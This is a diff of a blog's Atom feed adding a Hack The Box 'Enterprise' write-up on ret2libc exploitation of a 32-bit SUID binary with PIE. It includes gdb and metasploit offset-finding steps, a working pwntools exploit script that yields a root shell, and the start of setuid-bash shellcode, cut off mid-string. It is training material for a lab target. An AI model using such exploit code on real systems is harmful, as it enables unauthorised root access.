@@ -4,7 +4,7 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-04-03T23:14:25+08:00</updated>
+ <updated>2022-04-03T23:20:17+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
@@ -102,6 +102,337 @@ Parameter: query &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GET&lt;span class
 
 &lt;h2 id=&quot;htb-unattended-nested-sql-injection&quot;&gt;HTB Unattended nested SQL Injection&lt;/h2&gt;
 &lt;p&gt;This box is tough, I haven’t understand fully &lt;a href=&quot;https://0xdf.gitlab.io/2019/08/24/htb-unattended.html#shell-as-www-data&quot;&gt;this&lt;/a&gt; technique but I will put it here for reference.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Bypass PIE (32-bit) - Ret2libc</title>
+   <link href="https://mvineza.github.io/spindel/2022/04/03/bypass-pie-32bit-ret2libc"/>
+   <updated>2022-04-03T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/04/03/Bypass-PIE--32bit---Ret2libc</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;If most stack protections are disabled except for PIE, attacker can leverage ret2libc method to do privilege escalation.&lt;/p&gt;
+
+&lt;h2 id=&quot;environment-setup-and-requirements&quot;&gt;Environment Setup and Requirements&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;SUID binary inside victim machine&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 12152 Sep  8  2017 /bin/lcars
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;PIE is enabled on binary&lt;/li&gt;
+  &lt;li&gt;ASLR is disabled on victim machine&lt;/li&gt;
+  &lt;li&gt;DEP or NX bit is not set on binary&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt; present on victim machine&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt; tools will be used by attacker&lt;/li&gt;
+  &lt;li&gt;Ghidra will be used&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;p&gt;Verify stack protections.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# victim machine - ASLR is off&lt;/span&gt;
+www-data@enterprise:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space 
+0
+www-data@enterprise:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# attacker machine (get copy of binary) - only PIE is enabled&lt;/span&gt;
+➜  lcars checksec ./lcars
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+➜  lcars 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;.Try running binary and find the access code.  Do this inside victim machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace lcars
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asas&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;picarda1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# access code is picarda1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that we have the access code, let’s try to fuzz the binary and see where it SEGFAULT.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@enterprise:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lcars
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code: 
+picarda1
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+
+
+LCARS Bridge Secondary Controls &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Main Menu: 
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;input: 
+4
+Disable Security Force Fields
+Enter Security Override:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4]    111288 segmentation fault  ./lcars
+www-data@enterprise:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# We can see here that it segfaulted at option 4, security.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since gdb is available inside victim machine, let’s inspect the internals.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000508  _init
+0x00000540  strcmp@plt
+0x00000550  setresuid@plt
+0x00000560  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt
+0x00000570  fflush@plt
+0x00000580  fgets@plt
+0x00000590  puts@plt
+0x000005a0  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@plt
+0x000005b0  __libc_start_main@plt
+0x000005c0  __isoc99_scanf@plt
+0x000005e0  _start
+0x00000620  __x86.get_pc_thunk.bx
+0x00000630  deregister_tm_clones
+0x00000670  register_tm_clones
+0x000006c0  __do_global_dtors_aux
+0x00000710  frame_dummy
+0x0000074c  __x86.get_pc_thunk.dx
+0x00000750  startScreen
+0x000007d4  disableForcefields
+0x0000085e  main_menu
+0x00000b6a  unable
+0x00000ba8  bridgeAuth
+0x00000c91  main
+0x00000d30  __libc_csu_init
+0x00000d90  __libc_csu_fini
+0x00000d94  _fini
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There is some functions, but its quite hard to follow.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas main_menu
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main_menu:
+   0x0000085e &amp;lt;+0&amp;gt;:	push   ebp
+   0x0000085f &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x00000861 &amp;lt;+3&amp;gt;:	push   ebx
+   0x00000862 &amp;lt;+4&amp;gt;:	sub    esp,0x1a4
+   0x00000868 &amp;lt;+10&amp;gt;:	call   0x620 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;
+   0x0000086d &amp;lt;+15&amp;gt;:	add    ebx,0x2793
+   0x00000873 &amp;lt;+21&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0xd4],0x0
+   0x0000087d &amp;lt;+31&amp;gt;:	call   0x750 &amp;lt;startScreen&amp;gt;
+   0x00000882 &amp;lt;+36&amp;gt;:	sub    esp,0xc
+   0x00000885 &amp;lt;+39&amp;gt;:	lea    eax,[ebx-0x2113]
+   0x0000088b &amp;lt;+45&amp;gt;:	push   eax
+   0x0000088c &amp;lt;+46&amp;gt;:	call   0x590 &amp;lt;puts@plt&amp;gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+   0x00000b69 &amp;lt;+779&amp;gt;:	ret    
+End of assembler dump.
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So let’s grab a copy and analyze the binary in Ghidra inside our attacker machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/31E67999-8DDB-47C7-9AD0-B5C729F144BA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/924381DF-578B-4D2C-94FE-66D0689075C4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are multiple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scaf&lt;/code&gt; invocations. These functions are dangerous since it doesn’t have limit on how much buffer the user can put. We are interested in option 4 since that is where the SEGFAULT happened.&lt;/p&gt;
+
+&lt;p&gt;In Ghidra, it looks like its not calling a function,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/25666F20-6A4E-4650-B4E9-173E6F75A5C5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But based from &lt;a href=&quot;https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#static-analysis&quot;&gt;0xdf&lt;/a&gt;, its calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disableForcefields&lt;/code&gt;. Not sure why Ghidra is showing us that way but when I checked &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disableForcefields&lt;/code&gt;, it has same exact lines on what Ghidra showed us under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case 4:&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/B3207A83-BCD7-46B8-BAF8-67C49C51CC36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;While investigating on this, I also tried to look for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function_addr_table&lt;/code&gt; as 0xdf mentioned but I didnt saw it anywhere from my Ghidra output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/56A5AC4B-D1AD-4622-82A3-ADBF6919B975.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; is accepting only a buffer size of 204. This means beyond that, we can initiate the overflow.&lt;/p&gt;
+
+&lt;p&gt;Moving along, since we have now a better look in whats the binary is doing inside, we can now proceed on finding the offset and constructing our payload. Do this inside attacker machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# outside gdb&lt;/span&gt;
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 250
+
+&lt;span class=&quot;c&quot;&gt;# inside gdb&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+Disable Security Force Fields
+Enter Security Override:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x31684130 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# outside gdb again&lt;/span&gt;
+➜  enterprise /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 0x31684130          
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exact match at offset 212
+➜  enterprise 
+
+&lt;span class=&quot;c&quot;&gt;# EIP offset is 212&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since the PIE is enabled, meaning the program code region addresses will change, we will use ret2libc method to make it easier. Our payload format would be:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nop + system_addr + exit_addr + binsh_addr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s go back to victim machine and find the addresses using gdb.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Initialize binary&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;main
+Breakpoint 1 at 0xc91
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
+
+&lt;span class=&quot;c&quot;&gt;# Find system&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; p system
+&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0xf7e4c060 &amp;lt;system&amp;gt;
+
+&lt;span class=&quot;c&quot;&gt;# Find exit&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; p &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;  
+&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0xf7e3faf0 &amp;lt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Find /bin/sh&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# NOTE: This is part is critical, there are a lot of options&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       but we need to carefully choose what to use. Since our&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       program accepts accepts a string input and a newline,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       0x0a, we need to avoid 0x0a to prevent from breaking&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       the payload. We can choose all others except&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       0xf7f70a14. In this example, i will just choose the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       first one which is 0xf7f6ddd5.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; find &amp;amp;system,+9999999, &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;                                  
+0xf7f6ddd5
+0xf7f6e7e1
+0xf7f70a14
+0xf7f72582
+warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
+4 patterns found.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The lcars service is reachable from attacker machine, so we will use pwn tools to generate our exploit.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# eip offset = 212
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7e4c060&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7e3faf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7f72582&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;212&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10.10.10.61&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32812&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Bridge Access Code:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;picarda1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Waiting for input:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Security Override:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Launchine it immediately gives us a shell as root.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  lcars ./bof.py
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /root/root.txt
+33 /root/root.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;alternatives&quot;&gt;Alternatives&lt;/h2&gt;
+&lt;p&gt;HTB official walkthrough do this exploitation in another way. It didn’t use re2libc but It made use of environment variables and classic linux buffer overflow exploit sandwich:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nop + shellcode + return_addr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then it runs the python script and redirect the output to a file. From there, the actual exploitation is quite odd to me:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload.txt | &lt;span class=&quot;nb&quot;&gt;env&lt;/span&gt; - /bin/lcars
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It also asked to do the following commands before exploitation.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;unset env &lt;/span&gt;LINES 
+&lt;span class=&quot;nb&quot;&gt;unset env &lt;/span&gt;COLUMNS
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here is the full python script.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+ &lt;span class=&quot;c1&quot;&gt;# The below shellcode will copy /bin/bash to /tmp/writeup and chmod 4777 it
+&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Executing it with /tmp/writeup -p will grant a root shell
+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd9\xee\xbd\x8f\x1f\x9f\xe9\xd9\x74\x24\xf4\x5f\x29&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
